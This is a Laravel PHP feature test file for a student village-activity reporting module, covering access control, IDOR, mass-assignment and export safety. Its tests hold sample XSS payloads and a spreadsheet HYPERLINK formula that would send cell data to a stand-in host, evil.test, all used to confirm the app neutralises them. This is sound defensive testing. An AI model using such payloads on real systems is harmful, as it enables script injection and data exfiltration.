<?php

namespace Tests\Feature\Mahasiswa;

use App\Models\Desa;
use App\Models\KategoriKegiatan;
use App\Models\CapaianKegiatan;
use App\Models\Mahasiswa;
use App\Models\Mahasiswa_lokasi;
use App\Models\Pjdesa;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Maatwebsite\Excel\Excel as ExcelType;
use Maatwebsite\Excel\Facades\Excel;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use App\Exports\CapaianKegiatanExport;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
use Tests\TestCase;

class CapaianKegiatanTest extends TestCase
{
    use RefreshDatabase;

    /** @var array<int, KategoriKegiatan> */
    private array $kategori = [];

    protected function setUp(): void
    {
        parent::setUp();
        foreach ([1, 2] as $i) {
            $this->kategori[$i] = KategoriKegiatan::factory()->create(['nama_kategori' => 'Kategori '.$i]);
        }
    }

    private function loginKetua()
    {
        $user = $this->loginAs('mahasiswa', ['akses' => 'pjdesa']);
        Pjdesa::create(['email' => $user->email, 'id_desa' => Desa::factory()->create()->id_desa]);

        return $user;
    }

    private function payload(int $kategori, array $override = []): array
    {
        return $override + [
            'id_kategori' => $this->kategori[$kategori]->id_kategori,
            'bulan' => now()->toDateString(),
            'status_capaian' => 'P',
            'tautan' => 'https://drive.google.com/x',
            'permasalahan' => 'Masalah',
            'solusi' => 'Solusi',
            'kendala' => 'Kendala',
        ];
    }

    // IDOR: ketua tidak bisa mengubah capaian ketua lain
    public function test_cannot_edit_or_delete_other_students_capaian(): void
    {
        $capaianLain = CapaianKegiatan::factory()->create([
            'email' => 'ketua-lain@pps.test',
            'id_kategori' => $this->kategori[1]->id_kategori,
        ]);
        $this->loginKetua();

        $this->get('capaiankegiatan/edit/'.$capaianLain->id_capaian)->assertNotFound();
        $this->put('capaiankegiatan/update', $this->payload(1, ['id_capaian' => $capaianLain->id_capaian]))->assertNotFound();
        $this->put('capaiankegiatan/destroy', ['id_capaian' => $capaianLain->id_capaian])->assertNotFound();
        $this->assertDatabaseHas('capaian_kegiatan', ['id_capaian' => $capaianLain->id_capaian, 'solusi' => $capaianLain->solusi]);
    }

    public function test_listdata_escapes_free_text(): void
    {
        $user = $this->loginKetua();
        CapaianKegiatan::factory()->create([
            'email' => $user->email,
            'id_kategori' => $this->kategori[1]->id_kategori,
            'permasalahan' => '<img src=x onerror=alert(1)>',
            'tautan' => 'javascript:alert(1)',
        ]);

        $row = $this->getJson('capaiankegiatan/listdataserver?draw=1&start=0&length=10', ['X-Requested-With' => 'XMLHttpRequest'])
            ->assertOk()->json('data.0');

        $this->assertStringNotContainsString('<img', $row['permasalahan']);
        $this->assertSame(now()->startOfMonth()->translatedFormat('F Y'), $row['bulan_label']);
        $this->assertSame('', $row['tautan']);
        // Ketua: kolom aksi berisi tombol edit/hapus
        $this->assertStringContainsString('capaiankegiatan/edit/', $row['action']);
        $this->get('capaiankegiatan/listdata')->assertOk()->assertSee("data: 'action'", false)->assertSee('<th width="1">Aksi</th>', false);
    }

    // Anggota ditempatkan di desa yang ketuanya ketua-lain@pps.test
    private function loginAnggota()
    {
        $user = $this->loginAs('mahasiswa');
        $pj = Pjdesa::create(['email' => 'ketua-lain@pps.test', 'id_desa' => Desa::factory()->create()->id_desa]);
        $this->tempatkan($user->email, $pj->id_desa);

        return $user;
    }

    private function tempatkan(string $email, string $idDesa): void
    {
        $mhs = Mahasiswa::where('email', $email)->first() ?? Mahasiswa::factory()->create(['email' => $email]);
        // loginAs sudah membuat lokasi tahun ini; timpa desanya
        Mahasiswa_lokasi::updateOrCreate(['tahun' => (int) date('Y'), 'id_mahasiswa' => $mhs->id_mahasiswa], ['id_desa' => $idDesa, 'user_in_up' => $email]);
    }

    private function jumlahSampah(): int
    {
        return DB::table('pengurangan_sampah')->count();
    }

    public function test_ketua_bisa_crud_tanpa_mengubah_pengurangan_sampah(): void
    {
        $user = $this->loginKetua();
        $pjdesa = Pjdesa::where('email', $user->email)->first();
        $sampahAwal = $this->jumlahSampah();

        $this->get('capaiankegiatan/tambah')->assertOk()->assertSee('name="id_kategori"', false)
            ->assertDontSee('organik_kg', false)->assertDontSee('anorganik_kg', false)->assertDontSee('residu_kg', false)->assertDontSee('data-sampah-form', false);

        $this->put('capaiankegiatan/insert', $this->payload(1, ['bulan' => now()->startOfMonth()->addDays(2)->toDateString()]))
            ->assertOk()->assertJson(['success' => true]);
        $capaian = CapaianKegiatan::where('email', $user->email)->sole();
        $this->assertSame($pjdesa->id_pjdesa, $capaian->id_pjdesa);
        $this->assertSame(now()->startOfMonth()->toDateString(), Carbon::parse($capaian->bulan)->toDateString());

        // Duplikat bulan ditolak
        $this->put('capaiankegiatan/insert', $this->payload(2))->assertJsonMissing(['success' => true]);
        $this->assertSame(1, CapaianKegiatan::where('email', $user->email)->count());

        $this->get('capaiankegiatan/edit/'.$capaian->id_capaian)->assertOk()->assertSee($capaian->id_capaian)
            ->assertDontSee('organik_kg', false)->assertDontSee('data-sampah-form', false);

        $this->put('capaiankegiatan/update', $this->payload(2, ['id_capaian' => $capaian->id_capaian, 'solusi' => 'Solusi baru', 'status_capaian' => 'Y']))
            ->assertOk()->assertJson(['success' => true]);
        $capaian->refresh();
        $this->assertSame('Solusi baru', $capaian->solusi);
        $this->assertSame($this->kategori[2]->id_kategori, $capaian->id_kategori);

        $this->put('capaiankegiatan/destroy', ['id_capaian' => $capaian->id_capaian])->assertOk()->assertJson(['success' => true]);
        $this->assertDatabaseMissing('capaian_kegiatan', ['id_capaian' => $capaian->id_capaian]);

        $this->assertSame($sampahAwal, $this->jumlahSampah());
    }

    public function test_non_ketua_403_di_semua_route_tulis(): void
    {
        $user = $this->loginAnggota();
        $milikSendiri = CapaianKegiatan::factory()->create(['email' => $user->email, 'id_kategori' => $this->kategori[1]->id_kategori]);

        $this->get('capaiankegiatan/tambah')->assertForbidden();
        $this->get('capaiankegiatan/edit/'.$milikSendiri->id_capaian)->assertForbidden();
        $this->put('capaiankegiatan/insert', $this->payload(1, ['bulan' => now()->subMonth()->toDateString()]))->assertForbidden();
        $this->put('capaiankegiatan/update', $this->payload(1, ['id_capaian' => $milikSendiri->id_capaian, 'solusi' => 'Diubah']))->assertForbidden();
        $this->put('capaiankegiatan/destroy', ['id_capaian' => $milikSendiri->id_capaian])->assertForbidden();

        $this->assertSame(1, CapaianKegiatan::count());
        $this->assertDatabaseHas('capaian_kegiatan', ['id_capaian' => $milikSendiri->id_capaian, 'solusi' => $milikSendiri->solusi]);

        // Role pt di grup yang sama juga bukan ketua
        $this->loginAs('pt');
        $this->get('capaiankegiatan/tambah')->assertForbidden();
        $this->put('capaiankegiatan/insert', $this->payload(1))->assertForbidden();
    }

    public function test_idor_id_tidak_ada_404(): void
    {
        $this->loginKetua();
        $acak = (string) Str::uuid();

        $this->get('capaiankegiatan/edit/'.$acak)->assertNotFound();
        $this->put('capaiankegiatan/update', $this->payload(1, ['id_capaian' => $acak]))->assertNotFound();
        $this->put('capaiankegiatan/destroy', ['id_capaian' => $acak])->assertNotFound();
    }

    public function test_email_id_pjdesa_dan_field_sampah_dari_input_diabaikan(): void
    {
        $user = $this->loginKetua();
        $pjdesa = Pjdesa::where('email', $user->email)->first();
        $pjdesaLain = Pjdesa::create(['email' => 'ketua-lain@pps.test', 'id_desa' => Desa::factory()->create()->id_desa]);
        $sampahAwal = $this->jumlahSampah();
        $injeksi = ['email' => 'ketua-lain@pps.test', 'id_pjdesa' => $pjdesaLain->id_pjdesa, 'id_capaian_baru' => 'x',
            'organik_kg' => 99, 'anorganik_kg' => 99, 'residu_kg' => 99, 'jml_rumah' => 50, 'created_at' => '2000-01-01'];

        $this->put('capaiankegiatan/insert', $this->payload(1) + $injeksi)->assertOk()->assertJson(['success' => true]);
        $capaian = CapaianKegiatan::sole();
        $this->assertSame($user->email, $capaian->email);
        $this->assertSame($pjdesa->id_pjdesa, $capaian->id_pjdesa);
        $this->assertNotSame('2000', substr((string) $capaian->created_at, 0, 4));

        $this->put('capaiankegiatan/update', $this->payload(1, ['id_capaian' => $capaian->id_capaian]) + $injeksi)->assertOk();
        $capaian->refresh();
        $this->assertSame($user->email, $capaian->email);
        $this->assertSame($pjdesa->id_pjdesa, $capaian->id_pjdesa);
        $this->assertSame(0, CapaianKegiatan::where('email', 'ketua-lain@pps.test')->count());

        $this->assertSame($sampahAwal, $this->jumlahSampah());
    }

    public function test_tombol_tambah_dan_aksi_hanya_untuk_ketua(): void
    {
        $this->loginAnggota();
        CapaianKegiatan::factory()->create(['email' => 'ketua-lain@pps.test', 'id_kategori' => $this->kategori[1]->id_kategori]);

        $this->get('capaiankegiatan')->assertOk()->assertDontSee('capaiankegiatan/tambah', false);
        $this->get('capaiankegiatan/listdata')->assertOk()->assertDontSee("data: 'action'", false)->assertDontSee('<th width="1">Aksi</th>', false);
        $row = $this->getJson('capaiankegiatan/listdataserver?draw=1&start=0&length=10', ['X-Requested-With' => 'XMLHttpRequest'])->assertOk()->json('data.0');
        $this->assertSame('', $row['action']);

        $this->loginKetua();
        $this->get('capaiankegiatan')->assertOk()->assertSee('capaiankegiatan/tambah', false);
        $this->get('capaiankegiatan/listdata')->assertOk()->assertSee("data: 'action'", false);
    }

    public function test_anggota_melihat_capaian_kelompoknya_saja(): void
    {
        $this->loginAnggota();
        $kelompok = CapaianKegiatan::factory()->create(['email' => 'ketua-lain@pps.test', 'id_kategori' => $this->kategori[1]->id_kategori]);
        $pjLuar = Pjdesa::create(['email' => 'ketua-luar@pps.test', 'id_desa' => Desa::factory()->create()->id_desa]);
        $luar = CapaianKegiatan::factory()->create(['email' => $pjLuar->email, 'id_kategori' => $this->kategori[2]->id_kategori]);

        $data = $this->getJson('capaiankegiatan/listdataserver?draw=1&start=0&length=10', ['X-Requested-With' => 'XMLHttpRequest'])
            ->assertOk()->json('data');

        $this->assertCount(1, $data);
        $this->assertSame($kelompok->id_capaian, $data[0]['id_capaian']);
        $this->assertSame('', $data[0]['action']);
        $this->assertNotContains($luar->id_capaian, array_column($data, 'id_capaian'));

        // Tetap read-only: data kelompok tidak bisa diubah anggota
        $this->get('capaiankegiatan/edit/'.$kelompok->id_capaian)->assertForbidden();
        $this->put('capaiankegiatan/destroy', ['id_capaian' => $kelompok->id_capaian])->assertForbidden();

        // Anggota di desa tanpa ketua: kosong
        $this->loginAs('mahasiswa');
        $this->getJson('capaiankegiatan/listdataserver?draw=1&start=0&length=10', ['X-Requested-With' => 'XMLHttpRequest'])
            ->assertOk()->assertJsonCount(0, 'data');
    }

    public function test_export_anggota_sama_dengan_scope_listdata(): void
    {
        $user = $this->loginAnggota();
        $kelompok = CapaianKegiatan::factory()->create(['email' => 'ketua-lain@pps.test', 'id_kategori' => $this->kategori[1]->id_kategori]);
        $pjLuar = Pjdesa::create(['email' => 'ketua-luar@pps.test', 'id_desa' => Desa::factory()->create()->id_desa]);
        CapaianKegiatan::factory()->create(['email' => $pjLuar->email, 'id_kategori' => $this->kategori[2]->id_kategori]);

        $this->get('capaiankegiatan/export')->assertOk();
        // Controller mengirim email user mahasiswa ke export
        $rows = (new CapaianKegiatanExport($user->email))->collection();
        $this->assertCount(1, $rows);
        $this->assertSame($kelompok->email, $rows->first()['PJ Desa']);

        // Desa tanpa ketua: file kosong
        $lain = $this->loginAs('mahasiswa');
        $this->assertCount(0, (new CapaianKegiatanExport($lain->email))->collection());
    }

    public function test_export_capaian_teks_berawalan_sama_dengan_bukan_formula(): void
    {
        $user = $this->loginKetua();
        $formula = '=HYPERLINK("https://evil.test/?d="&B2,"Klik")';
        CapaianKegiatan::factory()->create(['email' => $user->email, 'id_kategori' => $this->kategori[1]->id_kategori,
            'permasalahan' => $formula, 'solusi' => '=1+1', 'kendala' => 'biasa']);

        $path = tempnam(sys_get_temp_dir(), 'cap').'.xlsx';
        file_put_contents($path, Excel::raw(new CapaianKegiatanExport($user->email), ExcelType::XLSX));
        $ws = IOFactory::load($path)->getActiveSheet();
        @unlink($path);

        // F = Permasalahan, G = Solusi (tanpa kolom No)
        $this->assertSame(DataType::TYPE_STRING, $ws->getCell('F2')->getDataType());
        $this->assertSame($formula, $ws->getCell('F2')->getValue());
        $this->assertSame(DataType::TYPE_STRING, $ws->getCell('G2')->getDataType());
        $this->assertSame('=1+1', $ws->getCell('G2')->getValue());
    }
}
